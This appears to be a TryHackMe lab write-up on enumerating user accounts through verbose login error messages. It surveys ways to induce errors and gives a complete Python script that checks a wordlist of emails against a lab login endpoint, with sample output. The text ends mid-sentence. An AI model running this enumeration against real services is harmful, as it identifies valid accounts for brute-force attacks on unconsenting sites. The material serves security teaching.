# Enumerating Users via Verbose Errors
## Understanding Verbose Errors

Imagine you're a detective with a knack for spotting clues that others might overlook. In the world of web development, verbose errors are like unintentional whispers of a system, revealing secrets meant to be kept hidden. These detailed error messages are invaluable during the debugging process, helping developers understand exactly what went wrong. However, just like an overheard conversation might reveal too much, these verbose errors can unintentionally expose sensitive data to those who know how to listen.

![image](https://github.com/user-attachments/assets/dcfc66b9-a3c7-42c1-91dd-d6fae9a42ff0)


Verbose errors can turn into a goldmine of information, providing insights such as:

+ **Internal Paths:** Like a map leading to hidden treasure, these reveal the file paths and directory structures of the application server which might contain configuration files or secret keys that aren't visible to a normal user.
+ **Database Details:** Offering a sneak peek into the database, these errors might spill secrets like table names and column details.
+ **User Information:** Sometimes, these errors can even hint at usernames or other personal data, providing clues that are crucial for further investigation.

### Inducing Verbose Errors
Attackers induce verbose errors as a way to force the application to reveal its secrets. Below are some common techniques used to provoke these errors:

+ **Invalid Login Attempts:** This is like knocking on every door to see which one will open. By intentionally entering incorrect usernames or passwords, attackers can trigger error messages that help distinguish between valid and invalid usernames. For example, entering a username that doesn’t exist might trigger a different error message than entering one that does, revealing which usernames are active.

+ **SQL Injection:** This technique involves slipping malicious SQL commands into entry fields, hoping the system will stumble and reveal information about its database structure. For example, placing a single quote ( ') in a login field might cause the database to throw an error, inadvertently exposing details about its schema.

+ **File Inclusion/Path Traversal:** By manipulating file paths, attackers can attempt to access restricted files, coaxing the system into errors that reveal internal paths. For example, using directory traversal sequences like ../../ could lead to errors that disclose restricted file paths.

+ **Form Manipulation:** Tweaking form fields or parameters can trick the application into displaying errors that disclose backend logic or sensitive user information. For example, altering hidden form fields to trigger validation errors might reveal insights into the expected data format or structure.

+ **Application Fuzzing:** Sending unexpected inputs to various parts of the application to see how it reacts can help identify weak points. For example, tools like Burp Suite Intruder are used to automate the process, bombarding the application with varied payloads to see which ones provoke informative errors.

### The Role of Enumeration and Brute Forcing
When it comes to breaching authentication, enumeration and brute forcing often go hand in hand:

+ **User Enumeration:** Discovering valid usernames sets the stage, reducing the guesswork in subsequent brute-force attacks.
+ **Exploiting Verbose Errors:** The insights gained from these errors can illuminate aspects like password policies and account lockout mechanisms, paving the way for more effective brute-force strategies.
In summary, verbose errors are like breadcrumbs leading attackers deeper into the system, providing them with the insights needed to tailor their strategies and potentially compromise security in ways that could go undetected until it’s too late.

### Enumeration in Authentication Forms
In this HackerOne [report](https://hackerone.com/reports/1166054)  , the attacker was able to enumerate users using the website's Forget Password function. Similarly, we can also enumerate emails in login forms. For example, navigate to [http://enum.thm/labs/verbose_login/] (http://enum.thm/labs/verbose_login/) and put any email address in the Email input field.

When you input an invalid email, the website will respond with **"Email does not exist."** indicating that the email has not been registered yet.

|![image](https://github.com/user-attachments/assets/9ac2b060-2871-495f-b7c4-778c877f5feb)
Email does not exist error message|

However, if the email is already registered, the website will respond with an "Invalid password" error message, indicating that the email exists in the database but the password is incorrect.

![image](https://github.com/user-attachments/assets/6550d52c-669c-4838-9865-cf217dc75c28)
Invalid password error message

### Automation
Below is a Python script that will check for valid emails in the target web app. Save the code below as script.py.

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
Click here for a breakdown of the script.
We can use a common list of emails from this repository.

Usernames list from github

Once you've downloaded the payload list, use the script on the AttackBox or your own machine to check for valid email addresses.

Note: As a reminder, we strongly advise using the AttackBox for this task.

script.py
user@tryhackme $ python3 script.py usernames_gmail.com.txt
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[VALID] xxxxxx@gmail.com
```

or use the script from: 

